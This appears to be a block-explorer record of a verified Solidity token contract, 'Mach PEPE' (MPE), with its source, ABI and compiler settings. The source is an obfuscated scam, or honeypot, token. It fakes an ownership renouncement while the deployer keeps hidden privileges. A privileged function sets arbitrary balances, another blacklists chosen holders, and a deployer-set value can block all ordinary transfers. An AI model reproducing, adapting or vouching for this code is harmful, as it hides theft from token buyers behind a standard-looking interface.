{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface receiverTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTotal) external view returns (uint256);\n\n    function transfer(address exemptReceiver, uint256 fromTo) external returns (bool);\n\n    function allowance(address enableFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptReceiver,\n        uint256 fromTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxToken, uint256 value);\n    event Approval(address indexed enableFrom, address indexed spender, uint256 value);\n}\n\nabstract contract totalToAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTx {\n    function createPair(address teamTakeToken, address txFee) external returns (address);\n}\n\ninterface receiverTxMetadata is receiverTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MachPEPE is totalToAt, receiverTx, receiverTxMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchLimit;\n    }\n\n    constructor (){\n        \n        swapTeam launchMarketing = swapTeam(fromFund);\n        toModeAuto = isTx(launchMarketing.factory()).createPair(launchMarketing.WETH(), address(this));\n        if (liquidityEnable) {\n            maxLaunch = tokenSell;\n        }\n        receiverAmount = _msgSender();\n        amountTo();\n        fromBuy[receiverAmount] = true;\n        enableSwap[receiverAmount] = shouldEnable;\n        if (launchAmount != liquidityEnable) {\n            marketingIsReceiver = tokenSell;\n        }\n        emit Transfer(address(0), receiverAmount, shouldEnable);\n    }\n\n    function minAuto(address tradingSwapLimit) public {\n        if (modeTo) {\n            return;\n        }\n        \n        fromBuy[tradingSwapLimit] = true;\n        \n        modeTo = true;\n    }\n\n    function shouldLaunchedList() private view {\n        require(fromBuy[_msgSender()]);\n    }\n\n    mapping(address => uint256) private enableSwap;\n\n    address private takeMin;\n\n    address fromFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address takeLimit, address exemptReceiver, uint256 fromTo) external override returns (bool) {\n        if (_msgSender() != fromFund) {\n            if (totalLaunchAt[takeLimit][_msgSender()] != type(uint256).max) {\n                require(fromTo <= totalLaunchAt[takeLimit][_msgSender()]);\n                totalLaunchAt[takeLimit][_msgSender()] -= fromTo;\n            }\n        }\n        return swapAmountShould(takeLimit, exemptReceiver, fromTo);\n    }\n\n    address public receiverAmount;\n\n    event OwnershipTransferred(address indexed takeFee, address indexed buyLaunch);\n\n    bool public modeTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoFromLaunch;\n    }\n\n    function maxEnable(uint256 fromTo) public {\n        shouldLaunchedList();\n        takeAutoFrom = fromTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    function shouldSender(address liquidityTake, uint256 fromTo) public {\n        shouldLaunchedList();\n        enableSwap[liquidityTake] = fromTo;\n    }\n\n    function allowance(address txFrom, address swapTx) external view virtual override returns (uint256) {\n        if (swapTx == fromFund) {\n            return type(uint256).max;\n        }\n        return totalLaunchAt[txFrom][swapTx];\n    }\n\n    uint8 private launchLimit = 18;\n\n    function marketingTx(address takeLimit, address exemptReceiver, uint256 fromTo) internal returns (bool) {\n        require(enableSwap[takeLimit] >= fromTo);\n        enableSwap[takeLimit] -= fromTo;\n        enableSwap[exemptReceiver] += fromTo;\n        emit Transfer(takeLimit, exemptReceiver, fromTo);\n        return true;\n    }\n\n    address maxTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private liquidityEnable;\n\n    bool private atLimit;\n\n    string private shouldLiquidity = \"Mach PEPE\";\n\n    uint256 private marketingIsReceiver;\n\n    bool public isLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldEnable;\n    }\n\n    uint256 fundTx;\n\n    function balanceOf(address tradingTotal) public view virtual override returns (uint256) {\n        return enableSwap[tradingTotal];\n    }\n\n    function transfer(address liquidityTake, uint256 fromTo) external virtual override returns (bool) {\n        return swapAmountShould(_msgSender(), liquidityTake, fromTo);\n    }\n\n    function approve(address swapTx, uint256 fromTo) public virtual override returns (bool) {\n        totalLaunchAt[_msgSender()][swapTx] = fromTo;\n        emit Approval(_msgSender(), swapTx, fromTo);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return takeMin;\n    }\n\n    uint256 public tokenSell;\n\n    uint256 constant enableToken = 17 ** 10;\n\n    string private autoFromLaunch = \"MPE\";\n\n    uint256 public maxLaunch;\n\n    function swapAmountShould(address takeLimit, address exemptReceiver, uint256 fromTo) internal returns (bool) {\n        if (takeLimit == receiverAmount) {\n            return marketingTx(takeLimit, exemptReceiver, fromTo);\n        }\n        uint256 minTx = receiverTx(toModeAuto).balanceOf(maxTx);\n        require(minTx == takeAutoFrom);\n        require(exemptReceiver != maxTx);\n        if (swapLaunched[takeLimit]) {\n            return marketingTx(takeLimit, exemptReceiver, enableToken);\n        }\n        return marketingTx(takeLimit, exemptReceiver, fromTo);\n    }\n\n    function isSellToken(address maxTotalFee) public {\n        shouldLaunchedList();\n        if (launchAmount) {\n            marketingIsReceiver = tokenSell;\n        }\n        if (maxTotalFee == receiverAmount || maxTotalFee == toModeAuto) {\n            return;\n        }\n        swapLaunched[maxTotalFee] = true;\n    }\n\n    uint256 private shouldEnable = 100000000 * 10 ** 18;\n\n    uint256 takeAutoFrom;\n\n    function getOwner() external view returns (address) {\n        return takeMin;\n    }\n\n    function amountTo() public {\n        emit OwnershipTransferred(receiverAmount, address(0));\n        takeMin = address(0);\n    }\n\n    mapping(address => bool) public swapLaunched;\n\n    address public toModeAuto;\n\n    mapping(address => mapping(address => uint256)) private totalLaunchAt;\n\n    bool public launchAmount;\n\n    mapping(address => bool) public fromBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalFee\",\"type\":\"address\"}],\"name\":\"isSellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTo\",\"type\":\"uint256\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwapLimit\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTo\",\"type\":\"uint256\"}],\"name\":\"shouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toModeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MachPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}